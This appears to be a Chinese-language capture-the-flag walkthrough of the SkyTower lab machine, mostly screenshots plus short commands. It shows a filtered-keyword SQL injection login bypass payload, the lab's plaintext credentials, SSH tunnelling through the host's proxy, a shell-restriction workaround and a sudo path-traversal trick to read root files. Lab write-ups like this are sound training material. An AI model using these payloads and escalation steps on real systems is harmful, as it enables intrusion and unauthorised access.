# SkyTower

![image-20200720020833766](assets/SkyTower.assets/image-20200720020833766.png)

![image-20200720021033516](assets/SkyTower.assets/image-20200720021033516.png)

![image-20200720021249255](assets/SkyTower.assets/image-20200720021249255.png)

![image-20200720021306614](assets/SkyTower.assets/image-20200720021306614.png)

![image-20200720022616200](assets/SkyTower.assets/image-20200720022616200.png)

简单的登录框输入`'`,测试出了注入点

使用burpsuit尝试绕过登录，但是在处理过程中发现，一些符号和词语被过滤了

![image-20200720025731777](assets/SkyTower.assets/image-20200720025731777.png)



![image-20200720030016698](assets/SkyTower.assets/image-20200720030016698.png)

首先是`or`应该被去除了，然后是`=`和`--`也被去除了

这时我们可以使用`||`替换`or`注释符号则只使用`#`

但是没有办法替换掉`=`

最终尝试出的payload应为

`' || 1=1#`

成功绕过，得到ssh账户凭证

![image-20200720031236840](assets/SkyTower.assets/image-20200720031236840.png)

```bash
Username: john
Password: hereisjohn
```



```bash
ssh john@192.168.43.93
```

但是我们在扫描是发现，ssh端口是被过滤掉的

![image-20200720031437222](assets/SkyTower.assets/image-20200720031437222.png)

而3128端口提供给我们一个代理

使用代理进行ssh转发

```bash
proxytunnel -p 192.168.43.93:3128 -d 127.0.0.1:22 -a 2222
```

重新链接本地端口

```bash
ssh -p 2222 john@127.0.0.1
```

![image-20200720032646942](assets/SkyTower.assets/image-20200720032646942.png)

成功登录，但是shell会立即断开

尝试使用`/bin/bash`作为参数

重新链接

```
ssh -p 2222 john@127.0.0.1 /bin/bash
```

![image-20200720033105977](assets/SkyTower.assets/image-20200720033105977.png)

这样得到的shell并不完整，这通常应该是bashrc中做了一些设置

查看一下

![image-20200720034056125](assets/SkyTower.assets/image-20200720034056125.png)

通常删除用户bashrc后会有系统重新有系统默认的/etc/bash.bashrc

我们备份一下并重新登录

![image-20200720034300639](assets/SkyTower.assets/image-20200720034300639.png)

```bash
ssh -p 2222 john@127.0.0.1
```

在网页服务目录下的login.php页面直接发现数据库凭证

登录数据库

```bash
mysql -u root -p
```





![image-20200720040742438](assets/SkyTower.assets/image-20200720040742438.png)

只有root，其他库

![image-20200720213103817](assets/SkyTower.assets/image-20200720213103817.png)

```bash
sara:ihatethisjob
william:senseable  
```

不能su

![image-20200720215346782](assets/SkyTower.assets/image-20200720215346782.png)

登录了一下网页，密码是一样的。是ssh凭证没问题。登录ssh

还是和之前的操作一样需要rm掉bashrc

ssh登录成功

![image-20200720223253848](assets/SkyTower.assets/image-20200720223253848.png)

可以cat或者ls。我们可以利用`..`

```bash
sudo /bin/ls /accounts/../root
```

![image-20200720223434831](assets/SkyTower.assets/image-20200720223434831.png)

```bash
sudo /bin/cat /accounts/../root/flag.txt
```

![image-20200720224947867](assets/SkyTower.assets/image-20200720224947867.png)

![image-20200720225025791](assets/SkyTower.assets/image-20200720225025791.png)